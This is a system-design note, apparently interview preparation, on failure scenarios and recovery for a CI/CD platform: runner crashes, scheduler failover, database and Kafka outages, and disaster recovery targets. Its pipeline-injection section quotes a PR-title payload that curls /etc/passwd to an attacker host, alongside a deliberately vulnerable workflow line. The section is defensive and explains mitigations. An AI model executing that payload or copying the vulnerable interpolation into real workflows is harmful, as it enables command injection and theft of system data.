# 11 — Failure Scenarios & Recovery: CI/CD Platform

---

## Objective

Analyze concrete failure modes — runner crashes, Scheduler failure, database unavailability, secret service outage, and pipeline injection attacks — with exact recovery procedures, data loss risk, and prevention strategies.

---

## Failure 1: Runner Pod Crashes Mid-Job

### Scenario
Runner pod executing job "build" is OOM-killed by Kubernetes. Job is 60% complete.

### Impact
- In-progress job is lost
- Logs up to point of crash may be partially preserved (flushed to S3 before crash)
- Artifacts not uploaded (job didn't complete)
- Workspace destroyed with pod

### Detection
- Kubernetes: pod status → `OOMKilled` or `Error`
- Scheduler: heartbeat timeout (runner stopped sending heartbeats, default 2-minute detection)
- Log Service: runner connection dropped mid-stream

### Recovery Sequence

```
T+0:    Runner pod crashes
T+0–2m: Runner heartbeats stop; Scheduler heartbeat monitor detects
T+2m:   Scheduler: SELECT jobs WHERE runner_id=<dead> AND status=RUNNING
T+2m:   Job retry_count < max_retries (default 3)?
          YES: UPDATE jobs SET status=QUEUED, runner_id=NULL, retry_count++
               Publish JobDispatchEvent (re-dispatch)
          NO:  UPDATE jobs SET status=FAILED, conclusion=RUNNER_FAILURE
               Trigger dependency cascade (downstream jobs SKIPPED)
T+2m+:  New runner picks up re-queued job
T+2m+:  Job starts from scratch (no mid-job checkpoint)
```

### Mitigation
- Increase runner memory limit for memory-intensive build steps
- Enable `continue-on-error: true` for non-critical jobs
- OOM prevention: builder images don't hold large objects in memory; stream artifacts to S3 during build

### RTO: ~2 minutes + job re-run time
### RPO: All job output lost (job re-runs from scratch)

---

## Failure 2: Scheduler Service Crashes

### Scenario
The active Scheduler instance dies (JVM OOM, deployment restart). Standby instance is running.

### Impact During Outage (~5 seconds)
- New pipeline triggers not processed (accumulate in Kafka topic)
- In-progress jobs: **unaffected** (runners are autonomous)
- Job completions not processed (accumulate in `job-status` Kafka topic)
- New job dispatches blocked

### Recovery Sequence

```
T+0:   Scheduler crashes, loses PostgreSQL advisory lock
T+5s:  Standby Scheduler polls advisory lock → acquires it
T+5s:  Standby Scheduler starts consuming from kafka:pipeline-triggers
       and kafka:job-status (from last committed offset)
T+5s+: Processes any backlog accumulated during 5-second gap
T+5s+: Checks for orphaned jobs (status=RUNNING with old heartbeat) → re-queues
```

**Why no data loss?** Kafka offsets are committed after DB writes. If Scheduler crashes after DB write but before Kafka commit: re-processing produces duplicate DB writes — handled by idempotent upserts (`ON CONFLICT DO UPDATE`).

### Mitigation
- Standby Scheduler always running (deployment replica count = 2)
- Kafka consumer offsets durable — processing resumes from last committed offset

---

## Failure 3: PostgreSQL Primary Unavailable

### Scenario
PostgreSQL primary crashes. Read replica needs promotion (RDS Multi-AZ auto-failover).

### Impact Duration: ~30–60 seconds (RDS automatic failover)

| Operation | Impact |
|---|---|
| New run creation | Fails (Scheduler can't INSERT) |
| Job status updates | Fails (runner status reports fail) |
| Secret fetch | **Blocked** (Secret Service needs DB for decryption context) |
| Run status reads (UI) | Served from read replica until promotion |
| In-progress jobs | **Continue if secrets already fetched** |

### Recovery
1. RDS detects primary failure (health check)
2. RDS promotes read replica to primary (~30s)
3. New endpoint DNS record updated
4. Services reconnect (connection pool auto-reconnect)
5. Job status updates that failed during outage: runner retries status report (with backoff)

### Design for DB Unavailability
- Secrets fetched at job start — in-memory for duration of job. DB outage after job started doesn't affect running job
- Runner stores status locally and retries on reconnect: `JobStatusReport` is written to local file, retried until control plane accepts it
- Scheduler queues job dispatch events in Kafka — not dispatched until DB available (Kafka consumer offset not committed until DB write succeeds)

---

## Failure 4: Secret Service Unavailable

### Scenario
Secret Service pods crash or become unreachable. Running jobs can't fetch secrets.

### Impact
- New jobs that haven't started: **blocked at job start** (can't fetch secrets → job fails with `SECRET_FETCH_FAILED`)
- In-progress jobs (already have secrets in memory): **unaffected**
- Non-secret jobs: **unaffected** (secret fetch skipped if no secrets requested)

### Detection
- Runner gRPC call to Secret Service fails after 10s timeout → 3 retries → mark job FAILED
- Kubernetes liveness probe on Secret Service → pod restart

### Recovery
1. Kubernetes restarts Secret Service pods (crash loop back-off)
2. Secret Service reconnects to PostgreSQL + KMS
3. On restart: warm-up is instant (no in-memory state — reads from DB per request)
4. Queued jobs that failed with `SECRET_FETCH_FAILED` → re-queued by Scheduler (if within retry limit)

### SLA Impact
Secret Service is critical path for job starts. SLA: 99.99% (< 52 min/year downtime). Mitigation: 3 replicas, PodDisruptionBudget (at least 2 always available), cross-AZ placement.

---

## Failure 5: Log Service Unavailable

### Scenario
Log Service is down. Runners can't stream logs.

### Impact
- Running jobs: **continue executing** (runner buffers log lines locally, retries log upload)
- Log streaming to browser: disconnected (SSE connections drop)
- Log storage: may have gaps for the outage period

### Design for Log Service Failure

```
Runner log handling:
  try {
    logService.stream(chunk)
  } catch (ConnectionRefused) {
    localBuffer.append(chunk)
    schedule retry in 30 seconds
  }
  
  On reconnect: flush localBuffer to Log Service
  If job completes before Log Service recovers:
    Runner uploads full local log buffer directly to S3
    Reports S3 key to Scheduler via JobStatusEvent
```

**Jobs never fail due to Log Service outage.** Logs may have gaps or be delayed, but execution continues.

---

## Failure 6: Kafka Cluster Unavailable

### Scenario
Kafka cluster is down for 10 minutes.

### Impact Matrix

| Service | Depends on Kafka For | Impact |
|---|---|---|
| Webhook Service | Publish PipelineTriggerEvent | Triggers dropped (if no local buffer) |
| Scheduler | Consume triggers, dispatch jobs | No new jobs dispatched |
| Runner Pool | Consume job dispatch | No new jobs started |
| In-progress runners | Nothing (autonomous) | **No impact** |
| Notification Service | Consume run-completed | Notifications delayed |

### Mitigation

**Webhook buffering:**
```
Webhook Service:
  try:
    kafka.publish(PipelineTriggerEvent)
  except KafkaUnavailable:
    db.insert(trigger_queue, payload)  ← fallback to DB queue

Background recovery job:
  SELECT from trigger_queue WHERE processed=FALSE ORDER BY received_at
  Publish to Kafka (on recovery)
  Mark processed=TRUE
```

This ensures no triggers are lost during Kafka outage.

### Recovery Timeline

```
T+0:    Kafka becomes unavailable
T+0–10m: Triggers buffered in DB; no new jobs dispatched
T+10m:  Kafka recovers
T+10m:  Scheduler resumes consuming from last committed offset (replay missed triggers)
T+10m:  Webhooks buffered in DB re-published to Kafka
T+10m+: Jobs begin dispatching; lag clears over ~30 minutes
```

---

## Failure 7: Job Exceeds Time Limit

### Scenario
A developer pushes a workflow with an infinite loop in a step. Job runs indefinitely.

### Detection

```
Two independent timeout mechanisms:

1. Runner-side: monitors each step execution time
   if step_duration > step.timeout: send SIGTERM → SIGKILL
   Report: exit_code=124 (timeout)

2. Scheduler-side: job-level timeout monitor
   SELECT jobs WHERE status=RUNNING AND started_at < NOW() - timeout_minutes * INTERVAL '1 MINUTE'
   For each: Publish RunCancelledEvent(jobId)
   Runner receives cancellation → kills subprocess
```

**Why two mechanisms?** Runner timeout catches stuck steps quickly. Scheduler timeout catches runner itself stuck (e.g., runner process frozen, heartbeat still being sent).

### Recovery
1. Step killed by timeout
2. Job marked FAILED with `conclusion=TIMED_OUT`
3. User notified: "Job 'build' exceeded 30-minute timeout"
4. Dependent jobs SKIPPED

---

## Failure 8: Pipeline Injection via Webhook Payload

### Scenario
Attacker submits PR with crafted PR title: `$(curl attacker.com/exfil -d $(cat /etc/passwd))`

Vulnerable workflow:
```yaml
- run: echo "Processing PR: ${{ github.event.pull_request.title }}"
```

### Attack Chain
1. PR opens → webhook fires → Scheduler creates run
2. Job dispatched to runner with PR title in env context
3. Runner evaluates shell command → command injection → arbitrary execution

### Mitigation Layers

**Layer 1: Context interpolation sandboxing**
```
Platform evaluates ${{ expression }} → always results in a string
String is never shell-eval'd — it's passed as environment variable
```

```yaml
# Platform transforms:
#   ${{ github.event.pull_request.title }} → PR_TITLE env var
# Runner executes:
#   echo "Processing PR: $PR_TITLE"  (safe — shell reads $PR_TITLE as string)
```

**Layer 2: Fork PR restrictions**
- PRs from forks run without access to secrets
- `pull_request_target` event requires explicit opt-in + code review

**Layer 3: Input validation at parse time**
```
If workflow uses ${{ github.event.inputs.xxx }} in a `run:` block:
  Warn: "Potential injection risk — use env var intermediary"
```

**Layer 4: Execution sandboxing**
- Even if injection occurs: runner pod has no access to org secrets, DB, or other jobs
- Blast radius: attacker can exfiltrate the runner's workspace only

---

## Disaster Recovery

### RTO and RPO Targets

| Scenario | RTO | RPO |
|---|---|---|
| Single runner crash | 2 min + job re-run | All in-progress output |
| Scheduler crash | 5 seconds | Zero (Kafka replay) |
| PostgreSQL AZ failure | 60 seconds (RDS Multi-AZ) | Zero (synchronous replication) |
| Full region failure | 4 hours | Committed runs (not in-flight jobs) |
| Secret Service crash | 2 minutes | Zero (read from DB) |

### Cross-Region DR

**Active-Passive:**
- Primary region: full control plane + runner pool
- DR region: runner pool only + read replica of PostgreSQL
- Webhook routing: DNS failover to DR region (API Gateway)

**Failover procedure:**
1. Promote PostgreSQL read replica in DR region
2. Deploy control plane services to DR region (pre-baked container images)
3. Update DNS: webhook endpoint → DR region
4. In-flight jobs: lost (runners in primary region disconnected)
5. Recovery: re-trigger last N failed runs (via re-run API)

---

## Tradeoffs

| Decision | Why | Cost |
|---|---|---|
| Runner autonomy after job start | DB/Scheduler outage doesn't affect running jobs | No mid-job control (can't inject secrets after start) |
| 2-minute heartbeat timeout | Balance false positive (GC pause) vs late detection | 2 min of orphaned runner slot during failure |
| DB fallback for webhook buffer | No trigger loss during Kafka outage | Webhook service needs DB write capability |
| No mid-job checkpoint/resume | Simplicity; most jobs < 15 min | Long build jobs (1+ hour) re-run entirely on failure |

---

## Interview Discussion Points

- **What is the blast radius of a compromised runner?** Limited to: the job's workspace, the job's secrets (already fetched), ability to make outbound internet requests. Cannot read other orgs' secrets, access PostgreSQL, or affect other jobs. K8s NetworkPolicy blocks runner-to-control-plane traffic
- **How do you handle a 1-hour build that fails 59 minutes in?** Painful. No mid-job checkpoint. Options: (1) Split into multiple smaller jobs with artifact hand-off, (2) Add checkpoint/restore capability (cache workspace to S3, resume from checkpoint), (3) Increase job timeout and accept the re-run cost
- **What happens during a rolling deploy of the Scheduler service?** Standby Scheduler (running alongside) acquires leader lock when active Scheduler pod terminates. ~5 second gap. Running jobs unaffected. New dispatches delayed ~5s. No data loss
- **How do you prevent a rogue organization from DoSing the platform?** Concurrency limits per org, rate limiting on webhook ingestion, per-org Kafka partition isolation (jobs in separate partition key). Extreme case: org suspended via admin API → all new triggers rejected, existing runs allowed to complete
- **What happens if both primary and standby Schedulers crash simultaneously?** Triggers accumulate in Kafka (retained for 7 days). Running jobs complete autonomously. New jobs not dispatched until Scheduler restarts. Kubernetes will restart pods (crash loop back-off). Recovery: within minutes for pod restart, < 5 minutes for full recovery
